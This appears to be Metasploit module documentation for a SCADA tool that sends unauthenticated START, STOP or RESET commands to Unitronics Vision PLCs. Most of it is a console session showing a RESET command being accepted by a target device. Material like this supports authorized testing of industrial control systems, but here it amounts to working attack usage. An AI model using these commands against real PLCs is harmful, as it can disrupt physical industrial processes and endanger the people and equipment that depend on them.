## Vulnerable Application

  Unitronics Vision PLCs

## Verification Steps

  1. Do: `use auxiliary/admin/scada/pcom_command`
  2. Do: `set RHOST=IP` where IP is the IP address of the target
  3. Do: `run` to send PCOM command

 ## Scenarios

   ```
msf5 > use auxiliary/admin/scada/pcom_command
msf5 auxiliary(admin/scada/pcom_command) > show options

Module options (auxiliary/admin/scada/pcom_command):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   MODE    RESET            yes       PLC command (Accepted: START, STOP, RESET)
   RHOST                    yes       The target address
   RPORT   20256            yes       The target port (TCP)
   UNITID  0                no        Unit ID (0 - 127)

msf5 auxiliary(admin/scada/pcom_command) > set RHOST 192.168.1.1
RHOST => 192.168.1.1
msf5 auxiliary(admin/scada/pcom_command) > run

[*] 192.168.1.1:20256 - Sending RESET command
[*] 192.168.1.1:20256 - Command accepted
[*] Auxiliary module execution completed
msf5 auxiliary(admin/scada/pcom_command) >
```
